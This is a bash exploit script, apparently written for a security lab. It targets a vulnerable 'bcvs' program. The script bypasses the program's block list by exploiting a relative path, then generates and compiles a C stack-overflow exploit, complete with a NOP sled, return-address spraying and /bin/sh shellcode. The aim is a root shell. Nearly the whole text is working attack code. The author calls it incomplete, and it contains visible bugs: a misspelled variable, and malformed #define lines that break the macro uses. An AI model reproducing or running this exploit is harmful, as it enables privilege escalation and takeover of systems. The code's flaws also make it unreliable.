#!/bin/bash

## -------------------- Description -------------------- ##
# The bcvs program uses a relative path to check its
# "block.list". Therefore you can simply execute bcvs
# from a directory other than its usual but with the
# same directory layout and you can get around the blocks
#
# Right now this sploit is not complete but being able to
# bypass the block check is a start.
#
# Right now I am working on exploiting the strcpy/strcat
# overflow in the copyFile function.
## ----------------------------------------------------- ##

EXPLOIT_EXE="./exploit"
SPLOIT_DIR="sploit7_dir"


rm -rf $SPLIOT_DIR
mkdir -p $SPLOIT_DIR
cd $SPLOIT_DIR
mkdir -p .bcvs
touch .bcvs/block.list


cat <<EOS > "exploit.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BSIZE 800
#define NOP 0x90

#define STOP_ADDR = 560
#define START_NOPS = 559
#define START_SHELL_CODE = 720

// Shellcode for exec of /bin/sh
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void main(int argc, char* argv[]) {
  char buff[DEFAULT_BSIZE];
  char *ptr;
  long *long_ptr, addr;
  int i = 0;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BSIZE;

  if (argc > 1) offset = atoi(argv[1]);

  //We need to add offset to the stack pointer to have addr be in
  //argv[2] for this exploit
  addr = get_sp() + offset; //1139

  ptr = buff;
  //add 1 to account for shifting the bytes to align on word boundaries
  long_ptr = (long *) (ptr + 1);

  char *temp = ptr;
  for (i = 0; temp < (buff+bsize); i++) {
    *(temp++) = NOP;
  }


  for (i = 0; long_ptr < (buff + STOP_ADDR - 1); i += 4) {
	*(long_ptr++) = addr;
  }

  // Setup the nop sled
  char *buf_ptr = (char *) (ptr + 559); 
  for (i = (buff + START_NOPS); i < (buff + bsize); ++i) {
    *(buf_ptr++) = NOP;
    //buff[i] = NOP;
  }

  // Insert our shellcode
  ptr = (buff + START_SHELL_CODE);
  for (i = 0; i < strlen(shellcode); ++i) {
    *(ptr++) = shellcode[i];
  }

  buff[bsize-1] = '\0';
  printf(buff);
  return;
}
EOS

# Setup necessary environment
gcc -o exploit exploit.c

OFFSET=1139

SHELL_CODE=$($EXPLOIT_EXE)
#echo "$SHELL_CODE"

SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
if [[ $? -ne 0 ]]; then
  echo "Failed to generate shellcode"
  exit -1
fi

/opt/bcvs/bcvs co "${SHELL_CODE}"

#/usr/bin/gdb /opt/bcvs/bcvs
# And then hopefully you have a root shell at this point
